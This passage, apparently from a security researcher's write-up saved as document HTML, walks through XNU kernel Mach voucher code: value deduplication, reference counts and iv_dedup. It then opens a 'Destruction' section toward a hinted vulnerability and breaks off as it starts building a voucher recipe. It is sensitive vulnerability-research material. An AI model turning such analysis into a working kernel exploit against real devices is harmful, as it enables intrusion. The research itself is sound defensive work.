 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;value</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_next </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;index</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_next</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* found it? */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">index </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;IV_HASH_END</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* only add reference on non-persistent value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(!</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_persist</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* insert new entry in the table */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_freelist</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IV_FREELIST_END </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;index</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* freelist empty */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_grow_table</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">goto</span><span class="BGLtzooHlW-c4">&nbsp;restart</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* take the entry off the freelist */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_freelist </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_next</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* initialize the new entry */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_free </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_persist </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">flag </span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_PERSIST</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">?</span><span class="BGLtzooHlW-c4">&nbsp;TRUE </span><span class="BGLtzooHlW-c2">:</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* insert the new entry in the proper hash chain */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_next </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">hash_index</span><span class="BGLtzooHlW-c2">].</span><span class="BGLtzooHlW-c4">ivace_index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">hash_index</span><span class="BGLtzooHlW-c2">].</span><span class="BGLtzooHlW-c4">ivace_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* donated passed in ivac reference to new entry */</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>You&#39;ll notice that this code has a very similar structure to </span><span class="BGLtzooHlW-c11">user_data_dedup</span><span>; it needs to do almost exactly the same thing. Under a lock (this time the controller&#39;s lock) traverse a hash table looking for a matching value. If one can&#39;t be found, allocate a new entry and put the value in the hash table. The same unlock/lock dance is needed, but not every time because </span><span class="BGLtzooHlW-c11">ivace</span><span>&#39;s are kept in a table of </span><span class="BGLtzooHlW-c11">struct ivac_entry_s</span><span class="BGLtzooHlW-c10">&#39;s so the lock only needs to be dropped if the table needs to grow.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>If a new entry is allocated (from the freelist of </span><span class="BGLtzooHlW-c11">ivac_entry</span><span>&#39;s in the table) then its reference count (</span><span class="BGLtzooHlW-c11">ivace_refs</span><span>) is set to 1, and its </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;count is set to 1. If an existing entry is found then both its </span><span class="BGLtzooHlW-c11">ivace_refs</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">ivace_made</span><span class="BGLtzooHlW-c10">&nbsp;counts are incremented:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.5d6f231d91c5f3fcaedc02e8af1faacf22268e6f"></a><a id="t.33"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made</span><span class="BGLtzooHlW-c2">++;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Finally, the </span><span class="BGLtzooHlW-c17">index</span><span>&nbsp;of this entry in the table of all the controller&#39;s entries is returned, because it&#39;s the index into that table which a voucher stores; not a pointer to the </span><span class="BGLtzooHlW-c11">ivace</span><span class="BGLtzooHlW-c10">.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">ivace_reference_by_value</span><span>&nbsp;then calls </span><span class="BGLtzooHlW-c11">iv_set</span><span>&nbsp;to store that index into the correct slot in the voucher&#39;s </span><span class="BGLtzooHlW-c11">iv_table</span><span class="BGLtzooHlW-c10">, which is just a simple array index operation:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.ac2c12e184f7c3e12da13fbd6404f62d8c16842e"></a><a id="t.34"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_set</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key_index</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;val_index</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.49ce745eb25ac89c231f0c471abc9f82f9797477"></a><a id="t.35"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">void</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_set</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ipc_voucher_t iv</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; iv_index_t key_index</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; iv_index_t value_index</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key_index </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;iv</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">iv_table_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">iv_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;value_index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Our journey following this recipe is almost over! Since we only supplied one sub-recipe we exit the loop in </span><span class="BGLtzooHlW-c11">host_create_mach_voucher</span><span>&nbsp;and reach the call to </span><span class="BGLtzooHlW-c11">iv_dedup</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.bdeacdf6e0a60502a972f38307eadc992aacd7de"></a><a id="t.36"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">new_voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_dedup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>I won&#39;t show the code for </span><span class="BGLtzooHlW-c11">iv_dedup</span><span>&nbsp;here because it&#39;s again structurally almost identical to the two other levels of deduping we&#39;ve examined. In fact it&#39;s a little simpler because it can hold the associated hash table lock the whole time (via </span><span class="BGLtzooHlW-c11">ivht_lock()</span><span>) since it doesn&#39;t need to allocate anything. If a match is found (that is, the hash table already contains a voucher with exactly the same set of value indexes) then a reference is taken on that existing voucher and a reference is dropped on the voucher we just created from the input recipe via </span><span class="BGLtzooHlW-c11">iv_dealloc</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.1101ce1325bc496de996015edaf1a773d5d5120c"></a><a id="t.37"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_dealloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">new_iv</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The </span><span class="BGLtzooHlW-c11">FALSE</span><span>&nbsp;argument here indicates that </span><span class="BGLtzooHlW-c11">new_iv</span><span>&nbsp;isn&#39;t in the </span><span class="BGLtzooHlW-c11">ivht_bucket</span><span class="BGLtzooHlW-c10">&nbsp;hashtable so shouldn&#39;t be removed from there if it is going to be destroyed. Vouchers are only added to the hashtable after the deduping process to prevent deduplication happening against incomplete vouchers.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The final step occurs when </span><span class="BGLtzooHlW-c11">host_create_mach_voucher</span><span>&nbsp;returns. Since this is a MIG method, if it returns success and </span><span class="BGLtzooHlW-c11">new_voucher</span><span>&nbsp;isn&#39;t </span><span class="BGLtzooHlW-c11">IV_NULL</span><span>,</span><span>&nbsp;</span><span class="BGLtzooHlW-c11">new_voucher</span><span>&nbsp;will be converted into a mach port; a send right to which will be given to the userspace caller. This is the final level of deduplication; there can only ever be one mach port representing a particular voucher. This is implemented by the voucher structure&#39;s </span><span class="BGLtzooHlW-c11">iv_port</span><span class="BGLtzooHlW-c10">&nbsp;member.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>(For the sake of completeness note that there are actually two userspace interfaces to </span><span class="BGLtzooHlW-c11">host_create_mach_voucher</span><span>; the host port MIG method and also the </span><span class="BGLtzooHlW-c11">host_create_mach_voucher_trap</span><span class="BGLtzooHlW-c10">&nbsp;mach trap. The trap interface has to emulate the MIG semantics though.)</span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.gt3jam2tl3zw"><span>Destruction</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Although I did briefly hint at a vulnerability above we still haven&#39;t actually seen enough code to determine that that bug actually has any security consequences. This is where things get complicated ;-)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Let&#39;s start with the result of the situation we described above, where we created a voucher port with the following recipe:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6"></a><a id="t.38"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;udata_dword_recipe </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_recipe_data_t recipe</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; uint32_t payload</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;udata_dword_recipe r </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">};</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">key </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA</span><span class="BGLtzooHlW-c2">;</span></p>
